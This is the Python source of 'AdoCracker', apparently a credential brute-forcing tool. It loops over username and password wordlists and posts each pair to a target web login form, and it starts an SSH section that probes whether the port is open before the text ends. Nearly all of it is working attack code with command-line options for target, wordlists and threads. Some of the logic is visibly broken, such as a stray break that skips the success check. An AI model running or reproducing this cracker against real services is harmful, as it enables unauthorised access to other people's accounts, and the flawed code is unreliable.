import socket
import requests
import sys
from pyfiglet import figlet_format
import argparse
import time
import nmap

banner = "AdoCracker"
print(figlet_format(banner, font="standard"))
print("This is a password cracker tool for HTTP, FTP, SSH and SMTP")
print("Author @adomigold,", "Github account: https://github.com/adomigold/ \n")

parser = argparse.ArgumentParser()
parser.add_argument('-a', '--attack', type=str, help="Target url or IP adress")
parser.add_argument('-l', '--login', type=str, help="Target username")
parser.add_argument('-L', '--username_file', help="File contain usernames")
parser.add_argument('-p', '--password', type=str, help="Target Password")
parser.add_argument('-P', '--password_file', type=str, help="File contains passwords")
parser.add_argument('-t', '--threads', type=str, help="Thread connection")
parser.add_argument('-v', '--verbose', nargs='?', help="Enter show to see login attempts")
parser.add_argument('-s', '--service', type=str, help="Acceptable services are http, ftp, ssh and smtp")
parser.add_argument('-r', '--response', type=str, help="Web response after login failed attempt")
parser.add_argument('-o', '--port', type=int, help="SSH, FTP and SMTP ports")
args = parser.parse_args()

if len(sys.argv) < 2:
    print("\nType -h or --help on how to use")
    exit(0)

# Attacking HTTP Service
if args.service == "http":
    target = args.attack
    username = args.login
    username_file = args.username_file
    password = args.password
    password_file = args.password_file
    response = args.response

    if "://" not in target:
        print("Target must start with http:// or https://")
        exit(0)

    # When single password provided
    if args.password in sys.argv:
        file = open(username_file)
        user_list = file.readlines()

        for user in user_list:
            user = user.rstrip()

            if args.verbose in sys.argv:
                if args.verbose != "show":
                    break

                print('[+]', user, '_', password)
            post = {'username': user, 'password': password, 'submit': "Submit"}
            re = requests.post(target, data=post)
            if "Incorrect Login Information" in re.text:  # Change this according to the server respond when login attempt failed
                pass
            else:
                print("\n-----------------------------------------"
                      "\n Username found", '\033[1;92m', user,
                      "\n-----------------------------------------")
                break
        else:
            print("------------------------------------------------------------------"
                  "\n Sorry No password or username found on your wordlist"
                  "\n Please provide wordlist with more words to increase your chance"
                  "\n----------------------------------------------------------------")
            exit(0)

    # When username file is provided
    elif args.username_file in sys.argv:
        file = open(username_file)
        file2 = open(password_file)

        user_list = file.readlines()
        pwd_list = file2.readlines()
        for user in user_list:
            user = user.rstrip()
            for pwd in pwd_list:
                pwd = pwd.rstrip()

                if args.verbose in sys.argv:
                    if args.verbose != "show":
                        break

                    print('[+]', user, '_', pwd)
                post = {'username': user, 'password': pwd, 'submit': "Submit"}
                re = requests.post(target, data=post)
                break
                if "Incorrect Login Information" in re.text:  # Change this according to the server respond when login attempt failed
                    pass
                else:
                    print("\n------------------------------------------------"
                          "\n Username and Password found", '\033[1;92m', pwd,
                          "\n------------------------------------------------")
                    break
        else:
            print("------------------------------------------------------------------"
                  "\n Sorry No password or username found on your wordlist"
                  "\n Please provide wordlist with more words to increase your chance"
                  "\n----------------------------------------------------------------")
            exit(0)

    # When password file provided
    else:
        print("\033[1;34m------------------------------"
              "\n     adocracker is started      "
              "\nTake a cup of coffee and wait"
              "\n------------------------------")
        file = open(password_file)
        pwd_list = file.readlines()

        for pwd in pwd_list:
            pwd = pwd.rstrip()

            if args.verbose in sys.argv:
                if args.verbose != "show":
                    break

                print('\033[1;37m''[+]', username, '_', pwd)
            post = {'username': username, 'password': pwd, 'submit': "Submit"}
            re = requests.post(target, data=post)
            if "Incorrect Login Information" in re.text: # Change this according to the server respond when login attempt failed
                pass
            else:
                print("\n\033[1;92m-----------------------------------------"
                      "\n Password found:", pwd,
                      "\n------------------------------------------")
                break
        else:
            print("------------------------------------------------------------------"
                  "\n Sorry No password or username found on your wordlist"
                  "\n Please provide wordlist with more words to increase your chance"
                  "\n----------------------------------------------------------------")
            exit(0)

# Attacking SSH
if args.service == "ssh":
    # check if port number is provided
    if args.port in sys.argv is None:
        print("\033[1;31m-----------------------------------------"
              "\n Please specify port for SSH              "
              "\n------------------------------------------")
        exit(0)
    target = args.attack
    port = args.port
    username = args.login
    username_file = args.username_file
    password = args.password
    password_file = args.password_file

    #Check if SSH port is open
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    location = (target, port)
    try:
        print("\033[1;35m-----------------------------------------"
              "\n We are checking if port is open...              "
              "\n------------------------------------------")
        conn = a_socket.connect_ex(location)
        if conn == 0:
            print("\033[1;33m-----------------------------------------"
                  "\n Port is open... We proceed :)              "
                  "\n------------------------------------------")
        else:
            print("\033[1;31m-----------------------------------------"
                  "\n Sorry port is not open, check again :(          "
                  "\n-------------------------------------------------")
        a_socket.close()
    except:
        print("\033[1;31m-----------------------------------------"
              "\n Please specify port for SSH                     "
              "\n-------------------------------------------------")